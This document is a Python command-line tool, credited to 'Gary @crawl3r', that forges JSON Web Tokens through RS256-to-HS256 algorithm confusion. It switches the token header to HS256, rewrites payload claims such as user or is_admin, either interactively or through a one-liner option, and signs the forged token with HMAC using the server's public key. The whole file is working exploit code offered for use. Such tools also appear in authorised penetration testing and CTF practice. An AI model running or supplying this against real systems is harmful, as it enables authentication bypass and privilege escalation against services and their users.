#!/usr/local/python3
import hashlib
import base64
import hmac
import argparse
import json
import sys 

QUIET_OUTPUT_MODE = False
ONE_LINER_MODE = False

def banner():
    print("JWT the F**K?!")
    print("Modify and sign an RS256 jwt with a public key")
    print(" - Gary @crawl3r")


def handle_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("jwt", type=str, help="The server supplied JWT")
    parser.add_argument("pub", type=str, help="The local path to the public key file")
    parser.add_argument('--quiet', help='Surpress debug prints and output noise', action='store_true')
    parser.add_argument('--ol', help='Run in one-liner', action='store_true')
    parser.add_argument('--choices', type=str, help="Payload choices to patch. i.e: \"user:admin,is_admin:true\"")
    
    args = parser.parse_args()
    return args


def decode_jwt(jwt):
    chunks = jwt.split(".")
    
    if len(chunks) != 3:
        print("JWT does not look correct, check supplied")
        sys.exit(99)

    header = base64.urlsafe_b64decode(chunks[0] + "==").decode('utf-8')
    header = json.loads(header)
    payload = base64.urlsafe_b64decode(chunks[1] + "==").decode('utf-8')
    payload = json.loads(payload)

    return header, payload


def sanity_check_one_liner_args(choices, payload):
    split_choices = choices.split(",")

    for c in split_choices:
        split_choice = c.split(":")
        if len(split_choice) < 2:
            print("[!] Choice was not correctly submitted: %s" % c)
            return False

        if split_choice[0] not in payload.keys():
            print("[!] Choice was not within the original JWT payload: %s" % split_choice[0])
            return False

    return True


def load_public_key(file):
    f = open(file)
    key = f.read()
    return key


def handle_jwt_header_patching(header):
    patched_header = header

    # get stuck in logic loop
    if patched_header["alg"] != "HS256":
        patched_header["alg"] = "HS256"

        if QUIET_OUTPUT_MODE == False:
            print("[*] Algorithm patched to HMAC")
    else:
        if QUIET_OUTPUT_MODE == False:
            print("[*] JWT is already HMAC")

    return patched_header


def handle_jwt_payload_patching(payload):
    patched_payload = payload

    while True:
        # dump current options
        i = 0

        if QUIET_OUTPUT_MODE == False:
            print("Current payload options:")

        for key in patched_payload.keys():
            print("\t[%d] -> %s : %s : %s" % (i, key, patched_payload[key], type(patched_payload[key])))
            i += 1

        if QUIET_OUTPUT_MODE == False:
            print("[-1] -> Finish patching")
            print("")

        choice = int(input("Select the value above you want to patch: "))

        if choice != -1 and choice >= len(patched_payload.keys()):
            print("[!] Illegal choice")
            print("")
        elif choice == -1:
            if QUIET_OUTPUT_MODE == False:
                print("[*] Finished patching")

            break
        else:
            key_choice = list(patched_payload.keys())[choice]
            new_val = input("New value for %s (type: %s): " % (key_choice, type(patched_payload[key_choice])))
            patched_payload[key_choice] = new_val

    return patched_payload


def auto_patch_payload(choices, payload):
    patched_payload = payload
    split_choices = choices.split(",")

    for c in split_choices:
        split_choice = c.split(":")
        patched_payload[split_choice[0]] = split_choice[1]

    return patched_payload


def sign_new_jwt(key, header, payload):
    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode('utf-8')).decode('utf-8').rstrip("=")
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8').rstrip("=")

    hmac_sig = hmac.new(bytes(key, encoding='utf-8'), (encoded_header + "." + encoded_payload).encode('utf-8'), hashlib.sha256).digest()
    encoded_sig = base64.urlsafe_b64encode(hmac_sig).decode('utf-8').rstrip("=")
    return encoded_header + "." + encoded_payload + "." + encoded_sig


if __name__ == "__main__":
    args = handle_args()

    ONE_LINER_MODE = args.ol
    QUIET_OUTPUT_MODE = args.quiet

    if QUIET_OUTPUT_MODE == False:
        banner()

    if QUIET_OUTPUT_MODE == False:
        print("[*] Loading public key from: %s" % args.pub)

    public_key = load_public_key(args.pub)

    if QUIET_OUTPUT_MODE == False:
        print(public_key)

    if QUIET_OUTPUT_MODE == False:
        print("[*] Decoding supplied JWT")
    
    header, payload = decode_jwt(args.jwt)

    # Sanity check the input choices to patch and ensure they exist within the submitted cookie
    if ONE_LINER_MODE:
        if args.choices == None:
            if type(args.choices) is not str:
                sys.exit(99)

        sanity_check_passed = sanity_check_one_liner_args(args.choices, payload)
        if sanity_check_passed == False:
            sys.exit(99)
   
    if QUIET_OUTPUT_MODE == False:
        print("\tHeader: %s" % header)
        print("\tPayload: %s" % payload)

    # TODO: change the header (set to HS256)
    patched_header = handle_jwt_header_patching(header)
    
    if QUIET_OUTPUT_MODE == False:
        print("\tHeader: %s" % patched_header)

    patched_payload = {}
    
    if ONE_LINER_MODE:
        patched_payload = auto_patch_payload(args.choices, payload)
    else:
        patched_payload = handle_jwt_payload_patching(payload)
    
    if QUIET_OUTPUT_MODE == False:
        print("\tPayload: %s" % patched_payload)

    signed_jwt = sign_new_jwt(public_key, patched_header, patched_payload)

    if QUIET_OUTPUT_MODE == False:
        print("New JWT created and signed:")
        print("----------------------------------")

    print(signed_jwt)
    
    if QUIET_OUTPUT_MODE == False:
        print("----------------------------------")